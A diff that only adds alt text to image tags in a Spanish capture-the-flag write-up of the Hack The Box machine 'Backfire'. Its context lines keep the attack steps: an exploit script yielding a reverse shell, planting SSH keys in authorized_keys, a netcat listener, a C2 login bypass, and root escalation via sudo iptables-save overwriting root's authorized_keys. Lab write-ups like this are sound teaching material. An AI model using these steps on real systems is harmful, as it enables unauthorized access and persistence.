@@ -99,14 +99,14 @@ tenemos cosas interesantes, el clásico ssh, una pagina https - un puerto 80 que
 no hay nombre de dominio, al parecer no hay contenido, de momento no voy a hacer fuzzing, quiero ver primero la pagina en el puerto 443, y los archivos del puerto 8000
 
 443:
-<img src="/images/writeup-backfire/Pasted image 20250512075016.png">
+<img src="/images/writeup-backfire/Pasted image 20250512075016.png" alt="image">
 no muestra contenido, podría intentar hacerle fuzzing
 
 el fuzzing no ha funcionado, al parecer por el nombre de dominio
 
 8000:
 
-<img src="/images/writeup-backfire/Pasted image 20250512075442.png">
+<img src="/images/writeup-backfire/Pasted image 20250512075442.png" alt="image">
 /
 disable_tls.patch y havoc.yaotl
 
@@ -252,11 +252,11 @@ python3 exploit.py -t https://backfire.htb -i 127.0.0.1 -p 40056 -U ilya -P Coba
 ```
 
 nos dara una reverse shell como ilya:
-<img src="/images/writeup-backfire/Pasted image 20250512095310.png">
+<img src="/images/writeup-backfire/Pasted image 20250512095310.png" alt="image">
 
 la cual en poco tiempo se va a cerrar (habrá algún script que detecte esto y nos complique la terminal) pero si vamos rápido a su /home veremos la flag del usuario:
 
-<img src="/images/writeup-backfire/Pasted image 20250512095449.png">
+<img src="/images/writeup-backfire/Pasted image 20250512095449.png" alt="image">
 
 tambien tiene un directorio .ssh el cual no tiene una id rsa, pero si un authorized_keys, así que vamos a meter alli la key de nuestra maquina para que podamos conectarnos como ese usuario sin necesidad de contraseña
 
@@ -273,13 +273,13 @@ echo 'ssh.....user@user' > /home/ilya/.ssh/autrized_keys
 
 ahora, ganando la revershell de nuevo, y ejecutando este comando, podemos conectarnos como ilya sin contraseña:
 
-<img src="/images/writeup-backfire/Pasted image 20250512100422.png">
+<img src="/images/writeup-backfire/Pasted image 20250512100422.png" alt="image">
 
 
 ## Movimiento Lateral
 
 en el mismo directorio home, hay otro archivo .txt:
-<img src="/images/writeup-backfire/Pasted image 20250512100727.png">
+<img src="/images/writeup-backfire/Pasted image 20250512100727.png" alt="image">
 ***Sergej dice que ha instalado HardHatC2 para probar y que no ha echo ningún cambio de los defaults, espero que el prefiera havoc porque no quiero aprender otro framework de c2, tambien Go > C#***
 
 bastante raro, pero vamos a tomarlo como pista y mirando lo que dice, mas una pequeña búsqueda, vemos que es lo mismo que havoc, pero se nos dice que no ha cambiado los valores por defecto, supongo que contraseñas y demás
@@ -322,7 +322,7 @@ sh -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096 ilya@10.129.227.115
 ```
 
 en el navegador:
-<img src="/images/writeup-backfire/Pasted image 20250512104513.png">
+<img src="/images/writeup-backfire/Pasted image 20250512104513.png" alt="image">
 
 parece que hay un problema el cual no acepta parámetros o credenciales, investigando, veo que hay una vulnerabilidad para bypass el login de este framework
 
@@ -379,13 +379,13 @@ print(r.text)
 
 
 :D
-<img src="/images/writeup-backfire/Pasted image 20250512115044.png">
+<img src="/images/writeup-backfire/Pasted image 20250512115044.png" alt="image">
 
 ahora, para ejecutar comandos el articulo nos dice que debemos ir a la pestana implantinteract:
 
 y buscar la terminal:
 
-<img src="/images/writeup-backfire/Pasted image 20250512115554.png">
+<img src="/images/writeup-backfire/Pasted image 20250512115554.png" alt="image">
 
 para escribir comandos, usamos la parte de abajo de la pestana 
 
@@ -398,7 +398,7 @@ y estaremos en escucha:
 nc -lnvp 4445
 ```
 
-<img src="/images/writeup-backfire/Pasted image 20250512120015.png">
+<img src="/images/writeup-backfire/Pasted image 20250512120015.png" alt="image">
 
 tenemos nuestra revshell como el otro usuario *sergej*
 
@@ -409,11 +409,11 @@ echo 's...................0' > /home/sergej/.ssh/authorized_keys
 
 y desde otra terminal:
 
-<img src="/images/writeup-backfire/Pasted image 20250512121550.png">
+<img src="/images/writeup-backfire/Pasted image 20250512121550.png" alt="image">
 
 enumerando el sistema, vemos que tenemos la opcion de ejecutar iptables e iptables-save como root
 
-<img src="/images/writeup-backfire/Pasted image 20250512124604.png">
+<img src="/images/writeup-backfire/Pasted image 20250512124604.png" alt="image">
 
 buscando modos de escalar privilegios con esto, encontré un articulo interesante:
 https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/
@@ -454,7 +454,7 @@ sudo iptables-save -f /root/.ssh/authorized_keys
 ```
 
 y desde nuestra maquina local nos conectaremos:
-<img src="/images/writeup-backfire/Pasted image 20250512125324.png">
+<img src="/images/writeup-backfire/Pasted image 20250512125324.png" alt="image">
 
 ------------------------
 \
@@ -462,4 +462,4 @@ nos vemos en la siguiente maquina!
 
 ## H4ck th3 W0rld
 
-<img src="/images/devil.jpg" style="border-radius:200px; width:100px;">
+<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">
